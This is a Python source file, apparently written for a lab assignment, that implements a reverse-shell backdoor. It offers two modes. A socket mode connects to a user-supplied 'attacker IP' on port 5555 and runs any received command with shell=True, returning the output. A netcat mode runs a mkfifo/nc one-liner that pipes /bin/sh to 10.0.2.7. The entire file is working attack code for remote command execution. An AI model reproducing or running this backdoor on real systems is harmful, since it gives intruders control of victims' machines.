import socket 
import os
import subprocess
import threading

class backdoorSocket:

    def __init__(self, sock = None):
        self.encodedCommand = b'nothing'
        if sock is None:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        else:
            self.sock = sock

    def connect(self, host, port):
        self.sock.connect((host, port))
        self.sendReply("\nConnected!\n".encode())

    def sendReply(self, msg):
        bytesSent = 0
        
        while bytesSent < len(msg):
            sent = self.sock.send(msg[bytesSent:])
            if sent == 0:
                return True
            bytesSent = bytesSent + sent

    # receive messages using delimeter
    def receiveMsg(self):
        chunks = []

        # delimeter is set as @@
        # sender should encapsulate message e.g. @@msg@@
        delimetersReceived = 0

        while delimetersReceived < 2:
            try: 
                chunk = self.sock.recv(4096)
                delimeters = chunk.count(b'@@')
                endSignal = chunk.count(b'&')

                # instead of ending here, return to the calling function and handle closing further up
                if endSignal == 1:
                    return b'&'
                chunks.append(chunk)
                # if we receive both delimeters in the same chunk, return message
                if delimeters == 2:
                    beforeRemovingDelimeters =  b''.join(chunks)
                    afterRemovingDelimeters = beforeRemovingDelimeters.replace(b'@@', b"")
                    return afterRemovingDelimeters
                if delimeters == 1:
                    delimetersReceived  += 1
            except subprocess.CalledProcessError:
                pass

    # only for use if not planning to use delimeter
    # not recommended - 
    def receiveMsg2(self):
        msg = self.sock.recv(1024)
        return msg

    def shutdown (self):
        self.sock.close()

    def commandLine (self):

        self.encodedCommand = self.receiveMsg()

        decodedCommand = self.encodedCommand.decode()

        # does not handle exit command of & 
        reply = subprocess.check_output(decodedCommand, shell=True)

        self.sendReply(reply)

    def checkExit (self):
        encodedCommand = self.encodedCommand
        decodedCommand = encodedCommand.decode()

        # handle exit command of &

        if decodedCommand.count('&') == 1:
        #if decodedCommand == '&':
            self.sendReply("Shutting down!\n".encode())         
            self.shutdown()
            os.exit(0)


# start of main program


#kali_ip = "10.0.2.15" #This IP can be different on your virtual box

implementation_option = input("""\nPlease choose between the two shell connection options.\n
                                 \nOptions (type the exact string): sockets OR netcat
                                 \nYour Choice : """)

kali_port = 5555

if (implementation_option == "sockets"):

    connection = backdoorSocket()

    # ask user for IP only. port can stay the same (not likely to change in this assignment)

    kali_ip = input("\nPlease enter attacker IP : ")

    connection.connect(kali_ip, kali_port)

    # threading is used to constantly check the stored input encodedCommand for &

    exitConditionThread = threading.Thread(target=connection.checkExit)

    exitConditionThread.start()

    while True:
        connection.commandLine()

elif (implementation_option == "netcat"):

    command = """
                pipe=/tmp/xrvf; 

                mkfifo $pipe;  
                
                nc 10.0.2.7 5555 0<$pipe |
                
                /bin/sh -i >$pipe 2>&1; rm $pipe
                
                """


    subprocess.run(command, shell=True)

else:
    print("Wrong options entered. Try again")
    exit(1)
